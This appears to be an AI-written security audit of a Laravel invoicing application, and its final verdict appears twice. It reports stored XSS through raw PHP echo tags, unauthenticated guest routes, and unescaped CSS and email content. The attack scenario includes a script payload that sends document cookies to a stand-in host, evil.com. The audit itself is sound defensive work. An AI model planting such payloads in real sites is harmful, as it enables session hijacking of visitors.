## Final Verdict

---

### Vulnerability #1 (PRIMARY) — Stored Cross-Site Scripting via PHP Short Echo Tags in Guest Quote View

**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation — Cross-site Scripting)  
**CWE**: CWE-862 (Missing Authorization)

**File**: `/work/resources/views/guest/guest-quote-info.blade.php` — lines 163–164  
```php
<td colspan="3">{{ __('general_content.tax_trans_key') }} <?= $vatPrice[$key][0] ?> %</td> 
<td colspan="2" class="text-end"><?= $vatPrice[$key][1] ?> {{ $Factory->curency }}</td>
```

**Root cause**: The template uses raw PHP `<?= $var ?>` short-echo tags instead of Blade's `{{ $var }}` syntax, bypassing Blade's automatic HTML-escaping (`htmlspecialchars()`). This means the database-stored VAT rate value is rendered directly into the HTML without sanitization.

**Attack scenario**:
1. An authenticated user with VAT management privileges (or via CSV import) sets a VAT `rate` to a malicious payload such as `50</td><script>fetch('https://evil.com/?c='+document.cookie)</script><td>`.
2. When the factory sends a quote link (`/guest/quote/{uuid}`) to a customer or prospect, anyone visiting that link will execute the attacker's JavaScript.
3. The `/guest/quote/{uuid}` route has **no authentication** (CWE-862), making the attack trivially triggerable by anyone who obtains or guesses the UUID.
4. The XSS persists in the database — every visitor to that guest quote page is affected.

**Proof of concept**: The `$vatPrice` array is populated from `$quoteLine->VAT['rate']` in `QuoteCalculatorService::getVatTotal()`. The VAT rate is stored in the `accounting_vats` table and is modifiable by any user with VAT management permissions (or via CSV import). No sanitization is applied to the value before it hits the `<?= ?>` tag.

**Impact**: Session hijacking, cookie theft, phishing, defacement, and further internal attacks against anyone viewing a shared quote.

### Vulnerability #2 — Missing Authorization on Multiple Public Routes

**CWE**: CWE-862 (Missing Authorization)

**Affected routes** (from `/work/routes/web.php`):

| Route | Method | Purpose |
|---|---|---|
| `/guest/quote/{uuid}` | GET | View quote documents without auth |
| `/guest/order/{uuid}` | GET | View order documents without auth |
| `/guest/delivery/{uuid}` | GET | View delivery documents without auth |
| `/guest/nonConformitie/{id}` | GET | Create non-conformities from delivery lines without auth |
| `/pointage` | GET/POST | Record attendance entries without auth |
| `/order/ratings` | POST | Submit order ratings without auth |

These routes lack any authentication or authorization middleware and rely entirely on UUIDs (which are security-through-obscurity), or have no protection at all. An attacker with a leaked UUID (e.g., from an email, shared link, or log file) can access sensitive business documents including pricing, customer details, and delivery information.

### Vulnerability #3 — Stored XSS via Unescaped PDF Custom CSS

**CWE**: CWE-79 (Cross-site Scripting)

**File**: `/work/resources/views/print/partials/custom-styles.blade.php`  
```php
{!! $customCss !!}
```

**Root cause**: The Factory model's `pdf_custom_css` field is rendered with `{!! !!}` (unescaped Blade output). The `UpdateFactoryRequest` validates it only as a `nullable|string|max:65535` — no sanitization or encoding is applied. While CSS injection is less severe than script injection, modern browsers support CSS-based data exfiltration attacks (e.g., attribute selectors with `@import` URL callbacks).

---

### Vulnerability #4 — Stored/Reflected XSS in Email Content

**CWE**: CWE-79 (Cross-site Scripting)

**Files**:
- `/work/resources/views/emails/document.blade.php` line 10: `{!! $messageContent !!}`
- `/work/resources/views/emails/create.blade.php` line 41: `{!! $emailTemplate->content ?? '' !!}`

**Root cause**: Email message content from user input and stored email template content are rendered without escaping. While these are email templates (HTML emails are expected), the complete lack of sanitization means any HTML/JS injection is possible, affecting email recipients.

### Summary

| # | CWE | Name | Severity | Type |
|---|---|---|---|---|
| 1 | **CWE-79, CWE-862** | Stored XSS via PHP raw echo in unauthenticated guest quote view | **High** | Stored XSS + Auth bypass |
| 2 | CWE-862 | Missing authorization on 6+ public routes | Medium | Auth bypass |
| 3 | CWE-79 | Stored CSS injection via unescaped PDF custom CSS | Medium | CSS injection |
| 4 | CWE-79 | Stored/Reflected XSS in email rendering | Medium | Stored/Reflected XSS |

**Final determination**: Yes — this repository contains **zero-day vulnerabilities**. The primary finding is a **Stored Cross-Site Scripting (CWE-79)** vulnerability in the guest quote view, exacerbated by **Missing Authorization (CWE-862)** on the guest routes. The unescaped `<?= ?>` PHP tags in the Blade template bypass the template engine's built-in XSS protections and allow arbitrary JavaScript execution from stored database values, accessible to any visitor with a quote UUID link.
## Final Verdict

**Yes** — this repository introduces **zero-day vulnerabilities**.

### Primary Vulnerability: **CWE-79 + CWE-862** → Stored XSS via PHP Short Echo Tags in Unauthenticated Guest Quote View

**Severity**: **High**  

**File**: `/work/resources/views/guest/guest-quote-info.blade.php` (lines 163–164)

```php
<?= $vatPrice[$key][0] ?>          <!-- UNSAFE: raw PHP echo, no escaping -->
<?= $vatPrice[$key][1] ?>          <!-- UNSAFE: raw PHP echo, no escaping -->
```

These lines use raw PHP `<?= ?>` short-echo tags instead of Blade's `{{ }}` syntax. `<?= ?>` bypasses Blade's automatic `htmlspecialchars()` protection, meaning any HTML/JavaScript stored in the VAT rate database field is rendered directly into the page.

The data originates from `$quoteLine->VAT['rate']` (via `QuoteCalculatorService::getVatTotal()`), which is stored in the `accounting_vats` table and controllable by authorized users (or via CSV import). No sanitization is applied before rendering.

Critically, the route `/guest/quote/{uuid}` has **no authentication middleware** (CWE-862). An attacker who can set a malicious VAT rate value can execute arbitrary JavaScript in any visitor's browser — session hijacking, cookie theft, phishing, or further internal attacks — on every page load of that shared quote.

**Additional unauthenticated routes** (CWE-862):
- `/guest/order/{uuid}`, `/guest/delivery/{uuid}` — document exposure
- `/guest/nonConformitie/{id}` — non-conformity creation  
- `/pointage` (GET/POST) — attendance manipulation
- `/order/ratings` (POST) — rating manipulation

**Secondary findings** (both CWE-79):
- `{!! $customCss !!}` in `print/partials/custom-styles.blade.php` — unescaped CSS injection
- `{!! $messageContent !!}` and `{!! $emailTemplate->content ?? '' !!}` in email views — unescaped HTML email rendering
